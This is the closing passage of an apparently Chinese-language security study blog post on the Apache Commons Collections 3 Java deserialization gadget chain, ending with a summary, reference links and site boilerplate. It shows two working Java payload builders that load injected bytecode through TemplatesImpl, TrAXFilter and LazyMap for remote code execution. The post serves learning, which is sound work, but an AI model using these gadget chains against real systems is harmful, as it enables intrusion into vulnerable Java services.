+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>    Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;<br>    Field name = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>    name.setAccessible(<span class="hljs-keyword">true</span>);<br>    name.set(templates,<span class="hljs-string">&quot;zzz&quot;</span>);<br><br>    Field bytecodes = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>    bytecodes.setAccessible(<span class="hljs-keyword">true</span>);<br>    <span class="hljs-keyword">byte</span>[][] b = &#123;classBytes()&#125;;<br>    bytecodes.set(templates,b);<br><br>    Field tfactory = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>    tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>    tfactory.set(templates, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>    InstantiateTransformer instantiateTransformer = <br>        <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templates&#125;);<br><br>    ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>        <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>        instantiateTransformer<br>    &#125;);<br><br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    Map lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;q&quot;</span>));<br><br>    TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, <span class="hljs-string">&quot;111&quot;</span>);<br><br>    HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;222&quot;</span>);<br>    lazyMap.remove(<span class="hljs-string">&quot;111&quot;</span>);<br><br>    Class aClass = LazyMap.class;<br>    Field factory = aClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>    factory.setAccessible(<span class="hljs-keyword">true</span>);<br>    factory.set(lazyMap,chainedTransformer);<br><br><span class="hljs-comment">//        serialize(hashMap);</span><br>    deserialize();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>不过这里其实也可以不用<code>ChainedTransformer</code>，通过前面的报错，已知直接在传入<code>factory.set(lazyMap,InstantiateTransformer);</code>时，走到<code>InstantiateTransformer#transformer(Object input)</code>，input是TiedMapEntry的key，所以，直接把这个key变成<code>TrAXFilter.class</code>不就好了，下面是不使用<code>ChainedTransformer</code>的版本</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>    Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;<br>    Field name = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>    name.setAccessible(<span class="hljs-keyword">true</span>);<br>    name.set(templates,<span class="hljs-string">&quot;zzz&quot;</span>);<br><br>    Field bytecodes = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>    bytecodes.setAccessible(<span class="hljs-keyword">true</span>);<br>    <span class="hljs-keyword">byte</span>[][] b = &#123;classBytes()&#125;;<br>    bytecodes.set(templates,b);<br><br>    Field tfactory = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>    tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>    tfactory.set(templates, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>    InstantiateTransformer instantiateTransformer = <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templates&#125;);<br><br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    Map lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;q&quot;</span>));<br><br>    TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, TrAXFilter.class);<br><br>    HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;222&quot;</span>);<br>    lazyMap.remove(TrAXFilter.class);<br><br>    Class aClass = LazyMap.class;<br>    Field factory = aClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>    factory.setAccessible(<span class="hljs-keyword">true</span>);<br>    factory.set(lazyMap,instantiateTransformer);<br><br><span class="hljs-comment">//        serialize(hashMap);</span><br>    deserialize();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>向邵爷、范爷的学习的第N天！！！🫡</p>
+<p>目前所有学过的链的图</p>
+<p><img src="/2022/10/08/CommonsCollections3/12.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Zf4y1F74K/?spm_id_from=333.788&vd_source=db93b94230228cb739b48f4f59e74abd">Java反序列化CommonsCollections篇(三)-另一种命令执行方式</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections3.java">ysoserial_CommonsCollections3.java</a></li>
+</ul>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/">#Java安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CommonsCollections3</div>
+      <div>http://example.com/2022/10/08/CommonsCollections3/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Mechoy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年10月8日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/15/CommonsCollections2/" title="CommonsCollections2">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CommonsCollections2</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/01/CommonsCollections6/" title="CommonsCollections6">
+                        <span class="hidden-mobile">CommonsCollections6</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://mechoy.github.io" target="_blank" rel="nofollow noopener"><span>Mechoy</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
